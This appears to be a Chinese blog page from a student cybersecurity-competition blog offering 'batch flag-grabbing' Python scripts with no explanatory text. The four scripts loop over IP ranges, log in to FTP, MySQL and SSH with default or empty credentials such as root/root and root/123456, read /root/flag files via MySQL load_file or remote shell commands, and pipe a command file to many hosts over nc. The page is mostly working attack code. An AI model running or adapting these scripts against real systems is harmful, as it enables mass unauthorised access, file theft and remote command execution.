@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.18.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>中职网络空间安全批量拿Flag脚本 - 白菜日记</title>
+
+  
+    <meta name="description" content="FTP  1234567891011121314151617181920212223242526from ftplib import FTPimport timeimport threadingimport tarfileimport osdef ftpconnect(host,username,password,remotepath,localpath):        try:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中职网络空间安全批量拿Flag脚本">
+<meta property="og:url" content="https://blog.thecat.top/archives/PyGetFlag.html">
+<meta property="og:site_name" content="白菜日记">
+<meta property="og:description" content="FTP  1234567891011121314151617181920212223242526from ftplib import FTPimport timeimport threadingimport tarfileimport osdef ftpconnect(host,username,password,remotepath,localpath):        try:">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-07-13T16:53:00.000Z">
+<meta property="article:modified_time" content="2023-07-07T08:05:09.687Z">
+<meta property="article:author" content="Cat00011cat">
+<meta property="article:tag" content="白菜日记, Cat00011cat">
+<meta name="twitter:card" content="summary">
+  
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="白菜日记" type="application/atom+xml">
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="https://q2.qlogo.cn/headimg_dl?dst_uin=990667303&spec=100">
+  
+
+  
+
+  
+
+
+  
+    
+      <script async data-domain="blog.thecat.top" src=""></script>
+    
+      <script defer src="https://static.iirose.cn/bsz/bsz.js"></script>
+    
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about"><div class="bg" style="opacity:0;background-image:url(https://static.iirose.cn/hexo/stellar/rainbow.webp);"></div><img no-lazy class="avatar" src="https://q2.qlogo.cn/headimg_dl?dst_uin=990667303&spec=100" onerror="javascript:this.classList.add('error');this.src='https://static.iirose.cn/hexo/stellar/placeholder/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">白菜日记</div><div class="sub normal cap">热爱可抵岁月漫长</div><div class="sub hover cap" style="opacity:0"> 风起风止我都在</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/msg">留言</a><a class="nav-item" href="/link">友链</a><a class="nav-item" href="/about">关于</a></nav>
+</header>
+
+
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" placeholder="站内搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+
+<widget class="widget-wrapper recent"><div class="widget-header cap theme dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/feed"><svg class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8938"><path d="M800.966 947.251c0-404.522-320.872-732.448-716.69-732.448V62.785c477.972 0 865.44 395.987 865.44 884.466h-148.75z m-162.273 0h-148.74c0-228.98-181.628-414.598-405.678-414.598v-152.01c306.205 0 554.418 253.68 554.418 566.608z m-446.24-221.12c59.748 0 108.189 49.503 108.189 110.557 0 61.063-48.44 110.563-108.188 110.563-59.747 0-108.18-49.5-108.18-110.563 0-61.054 48.433-110.556 108.18-110.556z" p-id="8939"></path></svg></a></div><div class="widget-body related-posts fs14"><a class="item title" href="/archives/2020.html"><span class="title">我的2020</span></a><a class="item title" href="/archives/ARPAndDNS.html"><span class="title">局域网下ARP欺骗以及DNS劫持</span></a><a class="item title" href="/archives/2021zhongzhizuwangluoanquan.html"><span class="title">2021中职网络空间安全竞赛知识大纲</span></a><a class="item title" href="/archives/apkttf.html"><span class="title">如何优雅提取app软件的apk格式中的字体？</span></a><a class="item title" href="/archives/aprimg.html"><span class="title">局域网下获取目标主机的图片流量</span></a></div></widget>
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%A6%82%E8%AF%97/">代码如诗</a></div><div id="post-meta">发布于&nbsp;<time datetime="2021-07-13T16:53:00.000Z">2021-07-14</time><br />pv: <span id="busuanzi_page_pv">-</span> | uv: <span id="busuanzi_page_uv">-</span></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>中职网络空间安全批量拿Flag脚本</span></h1>
+<!--markdown-->FTP
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ftpconnect</span>(<span class="params">host,username,password,remotepath,localpath</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            ftp = FTP()</span><br><span class="line">            ftp.connect(host,<span class="number">21</span>)</span><br><span class="line">            ftp.login(username,password)</span><br><span class="line">            bufsize = <span class="number">1024</span></span><br><span class="line">            fp = <span class="built_in">open</span>(localpath,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">            ftp.retrbinary(<span class="string">&#x27;RETR &#x27;</span>+ remotepath, fp.write,bufsize)</span><br><span class="line">            ftp.set_debuglevel(<span class="number">0</span>)</span><br><span class="line">            ftp.quit()</span><br><span class="line">            fp.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            fp.write(host)</span><br><span class="line">            fp.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">120</span>):</span><br><span class="line">                ip = <span class="string">&#x27;10.124.0.&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">                p=threading.Thread(target=ftpconnect,args=(ip,<span class="string">&#x27;ftp&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;/a.txt&#x27;</span>))</span><br><span class="line">                p.start()</span><br></pre></td></tr></table></figure>
+
+<p>MySql</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> MySQLdb</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">con</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        con=MySQLdb.connect(host=ip,user=<span class="string">&#x27;root&#x27;</span>,passwd=<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">        cur=con.cursor()</span><br><span class="line">        sql=<span class="string">&quot;select load_file(&#x27;/root/flagvalue.txt&#x27;);&quot;</span> //flag存放位置</span><br><span class="line">        cur.execute(sql)</span><br><span class="line">        re=cur.fetchall()</span><br><span class="line">        <span class="built_in">print</span> ip,re</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> er:</span><br><span class="line">        <span class="built_in">print</span> er</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">th</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">220</span>):</span><br><span class="line">        ip=<span class="string">&#x27;172.16.%s.101&#x27;</span> %i</span><br><span class="line">        t=threading.Thread(target=con,args=(ip,))</span><br><span class="line">        t.start()</span><br><span class="line">th()</span><br></pre></td></tr></table></figure>
+
+<p>NC</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span>    commands</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>,<span class="number">10010</span>):</span><br><span class="line">            a=commands.getstatusoutput(<span class="string">&#x27;nc -w 3 &#x27;</span>+ip+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(p)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;&lt;/root/cmd.txt&#x27;</span>)</span><br><span class="line">            <span class="comment">#/root/cmd.txt是本地的一个文件里面是执行命令</span></span><br><span class="line">            <span class="keyword">if</span> a[<span class="number">0</span>]==<span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span> (ip+<span class="string">&#x27; flag: &#x27;</span>+a[<span class="number">1</span>])</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        ip=<span class="string">&#x27;192.168.105.&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">        q=threading.Thread(target=get,args=(ip))</span><br><span class="line">        q.start()</span><br></pre></td></tr></table></figure>
+
+<p>SSH</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssh2</span>(<span class="params">ip,username,passwd,cmd</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh=paramiko.SSHClient()</span><br><span class="line">        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">        ssh.connect(ip,<span class="number">22</span>,username,passwd,timeout=<span class="number">5</span>)</span><br><span class="line">        stdin,stdout,stderr=ssh.exec_command(cmd)</span><br><span class="line">        stdin.write(<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">        out = stdout.read()</span><br><span class="line">        <span class="built_in">print</span> out </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;%s \t OK \n&#x27;</span> %(ip)</span><br><span class="line">        aa = <span class="built_in">open</span>(<span class="string">&quot;abc.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">        aa.write(ip)</span><br><span class="line">        aa.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        aa.write(out)</span><br><span class="line">        aa.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;%s \t Error \n&#x27;</span> %(ip)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;cat /root/flag.txt&quot;</span></span><br><span class="line">    username = <span class="string">&quot;root&quot;</span></span><br><span class="line">    passwd =<span class="string">&quot;123456&quot;</span></span><br><span class="line">    threads=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>,<span class="number">30</span>):</span><br><span class="line">        ip = <span class="string">&#x27;10.124.0.&#x27;</span> +<span class="built_in">str</span>(i)</span><br><span class="line">        a=threading.Thread(target=ssh2,args=(ip,username,passwd,cmd))</span><br><span class="line">        a.start()</span><br></pre></td></tr></table></figure>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本博客所有文章除特别声明外, 均采用 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议.<br />转载请注明本文链接: <a href="https://blog.thecat.top/archives/PyGetFlag.html">https://blog.thecat.top/archives/PyGetFlag.html</a></p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/archives/bsssn.html">关于比赛我的碎碎念</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/archives/Python-GUI.html">Python-GUI</a></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md-text reveal' id="comments">
+    <section class='header cmt-title cap theme'>
+      快来参与讨论吧
+    </section>
+    <section class='body cmt-body waline'>
+      
+
+<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </section>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs14">Blog</span><a href="/">Posts</a><a href="/tags/">Tags</a><a href="/archives/">Archives</a><a href="/categories/">Categories</a></div><div class="sitemap-group"><span class="fs14">Projects</span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://thecat.top">null</a></div><div class="sitemap-group"><span class="fs14">Social</span><a href="/link">Links</a><a href="mailto:990667303@qq.com" rel="external nofollow noreferrer">Mail</a><a href="/msg">Message</a></div><div class="sitemap-group"><span class="fs14">More</span><a href="/feed">Feed</a><a href="/about">About</a><a href="/sitemap.xml">Sitemap</a></div></div><div class="text"><p>pv: <span id="busuanzi_site_pv">-</span> &amp; uv: <span id="busuanzi_site_uv">-</span><br><a target="_blank" rel="noopener" href="//beian.miit.gov.cn">滇ICP备19010286号-1</a></p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.18.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.18.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://static.iirose.cn/hexo/stellar/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"codeblock":false,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js"});
+
+  stellar.plugins.marked = Object.assign("https://static.iirose.cn/hexo/stellar/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://static.iirose.cn/hexo/stellar/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://static.iirose.cn/hexo/stellar/swiper/swiper-bundle.min.css","js":"https://static.iirose.cn/hexo/stellar/swiper/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://static.iirose.cn/hexo/stellar/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":false,"service":"flying_pages","instant_page":"https://static.iirose.cn/hexo/stellar/preload/instant_page.js","flying_pages":"https://static.iirose.cn/hexo/stellar/preload/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://static.iirose.cn/hexo/stellar/fancybox/fancybox.umd.js","css":"https://static.iirose.cn/hexo/stellar/fancybox/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti/umd/heti.min.css","js":"https://unpkg.com/heti/umd/heti-addon.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function load_comment(){
+    if(!document.getElementById("waline_container"))return;
+    stellar.loadCSS('https://static.iirose.cn/hexo/waline/waline.css');
+    stellar.loadScript('https://static.iirose.cn/hexo/waline/waline.js', {defer:true}).then(function () {
+      const el = document.getElementById("waline_container");
+      var path = el.getAttribute('comment_id');
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      Waline.init(Object.assign({"js":"https://static.iirose.cn/hexo/waline/waline.js","css":"https://static.iirose.cn/hexo/waline/waline.css","serverURL":"https://waline.9420.ltd/","commentCount":true,"pageview":false,"copyright":false,"wordLimit":500,"imageUploader":false,"emoji":false,"requiredMeta":["nick","mail"],"pageSize":10,"locale":{"placeholder":"说些什么吧\r\nTips: 评论将在审核通过后展示"}}, {
+        el: '#waline_container',
+        path: path,
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    // console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+  
+    <link href="https://font.onmicrosoft.cn/lxgw-wenkai-screen-webfont@1.6.0/style.css" rel="stylesheet">
+  
+    <link href="https://static.iirose.cn/font/JetBrainMono/JetbrainMono.css" rel="stylesheet">
+  
+
+
+  </div>
+</body>
+</html>
